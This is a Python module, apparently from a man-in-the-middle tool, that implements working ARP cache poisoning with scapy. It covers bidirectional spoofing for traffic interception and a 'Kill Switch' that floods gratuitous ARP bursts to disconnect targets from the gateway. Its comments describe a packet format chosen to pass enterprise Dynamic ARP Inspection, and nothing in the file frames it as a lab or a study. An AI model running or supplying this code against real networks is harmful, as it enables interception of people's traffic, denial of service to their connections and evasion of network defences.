"""
ARP Spoofing Module
Performs ARP cache poisoning for Man-in-the-Middle or Denial-of-Service.
Also includes aggressive Kill Switch for reliable network disconnection.
"""
import io
import sys
import threading
import time

# Reusable null stderr for suppressing scapy warnings
_null_stderr = io.StringIO()

try:
    from scapy.all import ARP, Ether, sendp, getmacbyip
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

# Global state for clean shutdown
_running = False
_spoof_threads: list[threading.Thread] = []
_restore_pairs: list[tuple[str, str, str]] = []  # (target_ip, real_mac, spoofed_ip)

# Kill Switch state
_kill_running = False
_kill_threads: list[threading.Thread] = []
_kill_restore_pairs: list[tuple[str, str, str, str]] = []  # (victim_ip, real_mac, spoofed_ip, interface_hint)

# Kill Switch metrics (thread-safe, read by dashboard)
_kill_metrics_lock = threading.Lock()
_kill_total_packets = 0
_kill_start_time: float = 0.0
_kill_per_target: dict[str, dict] = {}  # {ip: {"packets": 0, "direction": "target"|"gateway"}}


def _silent_sendp(packet, count: int = 1, inter: float = 0.0):
    """sendp() with stderr suppressed to hide scapy warnings."""
    global _null_stderr
    old_stderr = sys.stderr
    sys.stderr = _null_stderr
    try:
        sendp(packet, count=count, verbose=0, inter=inter)
    finally:
        sys.stderr = old_stderr
        # Prevent unbounded memory growth: scrub scapy warnings from buffer.
        # Without this, _null_stderr accumulates warnings forever,
        # causing system lag after ~500k packets (hundreds of MB leaked).
        if _null_stderr.tell() > 1024 * 64:  # 64 KiB threshold
            _null_stderr.truncate(0)
            _null_stderr.seek(0)


def _get_mac(ip: str, timeout: float = 2.0) -> str | None:
    """Resolve MAC address via OS ping+cache (no scapy sndrcv)."""
    try:
        import subprocess
        import re
        subprocess.run(
            ["ping", "-n", "1", "-w", str(int(timeout * 1000)), ip],
            capture_output=True, timeout=timeout + 1
        )
        result = subprocess.run(
            ["arp", "-a", ip],
            capture_output=True, text=True, timeout=2
        )
        for line in result.stdout.splitlines():
            if ip in line:
                m = re.search(r"(([0-9A-Fa-f]{2}[:-]){5}[0-9A-Fa-f]{2})", line)
                if m:
                    return m.group(1).replace("-", ":").lower()
    except Exception:
        pass

    try:
        return getmacbyip(ip)
    except Exception:
        return None


def _spoof_loop(target_ip: str, spoof_ip: str, target_mac: str, interval: float = 2.0):
    """Continuously send spoofed ARP replies."""
    global _running

    packet = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip,
    )

    while _running:
        try:
            _silent_sendp(packet)
            time.sleep(interval)
        except Exception as e:
            print(f"\n[!] Spoof error ({target_ip} <- {spoof_ip}): {e}")
            time.sleep(1)


def _restore(target_ip: str, spoof_ip: str, real_mac: str):
    """Send correct ARP reply to restore the ARP table."""
    try:
        packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
            op=2,
            pdst=target_ip,
            hwdst="ff:ff:ff:ff:ff:ff",
            psrc=spoof_ip,
            hwsrc=real_mac,
        )
        _silent_sendp(packet, count=4, inter=0.2)
        print(f"  [✓] Restored {target_ip}: {spoof_ip} -> {real_mac}")
    except Exception as e:
        print(f"  [!] Restore failed for {target_ip}: {e}")


def start_spoof(targets: list[dict], gateway_ip: str, gateway_mac: str,
                interval: float = 2.0, bidirectional: bool = True):
    """Start ARP spoofing in background threads."""
    global _running, _spoof_threads, _restore_pairs

    if not SCAPY_AVAILABLE:
        print("[!] Scapy is not installed.")
        return False

    if _running:
        print("[!] Spoofing is already running. Stop it first.")
        return False

    _running = True
    _spoof_threads.clear()
    _restore_pairs.clear()

    print(f"\n[*] Starting ARP spoofing (interval={interval}s, bidirectional={bidirectional})")
    print(f"[*] Gateway: {gateway_ip} ({gateway_mac})")
    print(f"[*] Targets: {len(targets)} host(s)")

    for target in targets:
        t_ip = target["ip"]
        t_mac = target.get("mac") or _get_mac(t_ip)

        if not t_mac:
            print(f"[!] Could not resolve MAC for {t_ip}, skipping")
            continue

        print(f"  [+] Poisoning {t_ip} -> thinks we are {gateway_ip}")
        t1 = threading.Thread(
            target=_spoof_loop,
            args=(t_ip, gateway_ip, t_mac, interval),
            daemon=True
        )
        t1.start()
        _spoof_threads.append(t1)
        _restore_pairs.append((t_ip, gateway_mac, gateway_ip))

        if bidirectional:
            print(f"  [+] Poisoning gateway -> thinks we are {t_ip}")
            t2 = threading.Thread(
                target=_spoof_loop,
                args=(gateway_ip, t_ip, gateway_mac, interval),
                daemon=True
            )
            t2.start()
            _spoof_threads.append(t2)
            _restore_pairs.append((gateway_ip, t_mac, t_ip))

    print(f"\n[✓] ARP spoofing active on {len(_spoof_threads)} threads")
    print("[*] Press Ctrl+C to stop and restore ARP tables\n")
    return True


def stop_spoof():
    """Stop all spoofing and restore ARP tables."""
    global _running, _spoof_threads, _restore_pairs

    if not _running:
        return

    print("\n[*] Stopping ARP spoofing...")
    _running = False

    for t in _spoof_threads:
        t.join(timeout=3.0)

    _spoof_threads.clear()

    print("[*] Restoring ARP tables...")
    for target_ip, real_mac, spoofed_ip in _restore_pairs:
        _restore(target_ip, spoofed_ip, real_mac)

    _restore_pairs.clear()
    print("[✓] ARP tables restored\n")


def is_spoofing() -> bool:
    return _running


# ══════════════════════════════════════════════════════════════
#  KILL SWITCH — aggressive bidirectional ARP DoS
# ══════════════════════════════════════════════════════════════

def _kill_loop(victim_ip: str, spoof_ip: str, victim_mac: str,
               interval: float = 0.03, burst: int = 5, direction: str = "target"):
    """
    Aggressively poison a victim to think 'spoof_ip' is at OUR MAC.
    Uses broadcast GARP format — no hwsrc set (scapy auto-fills real MAC).
    Ether.src == ARP.hwsrc (both our real MAC) → passes AP DAI checks.
    With IP forwarding OFF, we simply drop all redirected traffic = kill switch.
    Tracks metrics for real-time dashboard.
    """
    global _kill_running, _kill_total_packets, _kill_per_target, _kill_metrics_lock

    # Broadcast GARP format — most reliable for ARP cache poisoning.
    # hwsrc NOT set → scapy fills attacker's real MAC, matching Ether.src.
    # This passes enterprise AP DAI checks (unlike mismatched fake MACs).
    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
        op=2,
        pdst=victim_ip,
        hwdst="ff:ff:ff:ff:ff:ff",
        psrc=spoof_ip,
    )

    # Per-target metric key.
    # For "gateway" direction, use spoof_ip (the target being impersonated) as the
    # dashboard row key so ← GW packets appear under the right target, not the gateway.
    if direction == "gateway":
        metric_key = f"{spoof_ip}|{direction}"
        metric_ip = spoof_ip
    else:
        metric_key = f"{victim_ip}|{direction}"
        metric_ip = victim_ip

    while _kill_running:
        try:
            for _ in range(burst):
                _silent_sendp(packet)
                time.sleep(0.003)
            # Update metrics (thread-safe)
            with _kill_metrics_lock:
                _kill_total_packets += burst
                if metric_key not in _kill_per_target:
                    # For gateway direction, we don't have target's MAC here —
                    # the dashboard will pick up the real MAC from the "target" entry.
                    if direction == "gateway":
                        metric_mac = "broadcast"
                    else:
                        metric_mac = victim_mac if victim_mac and not victim_mac.startswith("??") else "broadcast"
                    _kill_per_target[metric_key] = {"ip": metric_ip, "direction": direction, "packets": 0, "mac": metric_mac}
                _kill_per_target[metric_key]["packets"] += burst
            time.sleep(interval)
        except Exception as e:
            print(f"\n[!] Kill switch error ({victim_ip} <- {spoof_ip}): {e}")
            time.sleep(0.5)


def start_killswitch(targets: list[dict], gateway_ip: str, gateway_mac: str,
                     burst_interval: float = 0.03, burst_size: int = 5) -> bool:
    """
    WiFi poisoning  — bidirectional ARP poison using OUR real MAC.
    Targets redirect traffic to US; we drop it (IP forwarding must be OFF).
    No fake MACs → Ether.src == ARP.hwsrc → passes enterprise AP DAI checks.
    Sends via sendp() with stderr suppression.
    """
    global _kill_running, _kill_threads, _kill_restore_pairs

    if not SCAPY_AVAILABLE:
        print("[!] Scapy is not installed.")
        return False

    if _kill_running:
        print("[!] Kill switch is already active. Stop it first.")
        return False

    if _running:
        print("[!] ARP spoofing is active. Stop it first before using kill switch.")
        return False

    _kill_running = True
    _kill_threads.clear()
    _kill_restore_pairs.clear()

    # Reset metrics
    with _kill_metrics_lock:
        _kill_total_packets = 0
        _kill_start_time = time.time()
        _kill_per_target.clear()

    print(f"\n[*] Kill Switch engaging ({burst_size}pkt burst every {burst_interval}s)...")
    print(f"[*] Gateway: {gateway_ip} ({gateway_mac})")
    print(f"[*] Targets: {len(targets)} host(s)")

    for target in targets:
        t_ip = target["ip"]
        t_mac = target.get("mac") or _get_mac(t_ip)

        if not t_mac:
            print(f"[!] Could not resolve MAC for {t_ip}, skipping")
            continue

        # Thread 1: Poison TARGET — "gateway is at OUR MAC"
        # Target sends internet traffic to us, we drop it (IP forwarding OFF)
        print(f"   {t_ip} → gateway unreachable")
        t1 = threading.Thread(
            target=_kill_loop,
            args=(t_ip, gateway_ip, t_mac, burst_interval, burst_size, "target"),
            daemon=True
        )
        t1.start()
        _kill_threads.append(t1)
        _kill_restore_pairs.append((t_ip, gateway_mac, gateway_ip, t_mac))

        # Thread 2: Poison GATEWAY — "target is at OUR MAC"
        # Gateway sends response traffic to us, we drop it (IP forwarding OFF)
        if gateway_mac and not gateway_mac.startswith("??"):
            print(f"   gateway → {t_ip} unreachable (GARP broadcast)")
            t2 = threading.Thread(
                target=_kill_loop,
                args=(gateway_ip, t_ip, gateway_mac, burst_interval, burst_size, "gateway"),
                daemon=True
            )
            t2.start()
            _kill_threads.append(t2)
            _kill_restore_pairs.append((gateway_ip, t_mac, t_ip, gateway_mac))
        else:
            print(f"  ⚠ gateway MAC unknown — skipping gateway direction")

    total_threads = len(_kill_threads)
    cycle_time = burst_interval + 0.003 * burst_size
    pps = total_threads * burst_size * (1.0 / cycle_time)
    print(f"\n[✓] KILL SWITCH ACTIVE — {total_threads} poisoning threads")
    print(f"[✓] ~{pps:.0f} ARP poison packets/sec flooding the network")
    print("[*] Targets send traffic to US — we DROP it (IP forwarding OFF).")
    print("[*] No fake MACs → passes enterprise AP DAI / ARP inspection.")
    print("[*] Dashboard available — open a new terminal and run: python core/dashboard.py")
    return True


def get_kill_metrics() -> dict:
    """Return a snapshot of current kill switch metrics for the dashboard."""
    global _kill_total_packets, _kill_start_time, _kill_per_target, _kill_metrics_lock
    with _kill_metrics_lock:
        elapsed = time.time() - _kill_start_time if _kill_start_time > 0 else 0
        # Guard against near-zero elapsed (dashboard opened immediately after start)
        safe_elapsed = max(elapsed, 0.1)
        targets = [dict(d) for d in _kill_per_target.values()]
        return {
            "active": _kill_running,
            "total_packets": _kill_total_packets,
            "elapsed": elapsed,
            "pps": _kill_total_packets / safe_elapsed,
            "targets": targets,
        }


def stop_killswitch():
    """Stop the kill switch and restore all ARP tables."""
    global _kill_running, _kill_threads, _kill_restore_pairs

    if not _kill_running:
        return

    print("\n[*] Stopping Kill Switch...")
    _kill_running = False

    for t in _kill_threads:
        t.join(timeout=3.0)

    _kill_threads.clear()

    print("[*] Restoring ARP tables (sending 6 correction packets each)...")
    skipped = 0
    for victim_ip, real_mac, spoofed_ip, _ in _kill_restore_pairs:
        if not real_mac or real_mac.startswith("??"):
            skipped += 1
            continue
        try:
            restore_pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                op=2,
                pdst=victim_ip,
                hwdst="ff:ff:ff:ff:ff:ff",
                psrc=spoofed_ip,
                hwsrc=real_mac,
            )
            _silent_sendp(restore_pkt, count=6, inter=0.1)
            print(f"  [✓] Restored {victim_ip}: {spoofed_ip} → {real_mac}")
        except Exception as e:
            print(f"  [!] Restore failed for {victim_ip}: {e}")

    if skipped:
        print(f"  ⚠ {skipped} restore(s) skipped (MAC unknown) — ARP caches will auto-expire")

    _kill_restore_pairs.clear()
    print("[✓] Kill Switch disengaged — network restored\n")


def is_killswitch_active() -> bool:
    return _kill_running


if __name__ == "__main__":
    print("ARP Spoof module - import and use from mitm_app.py")
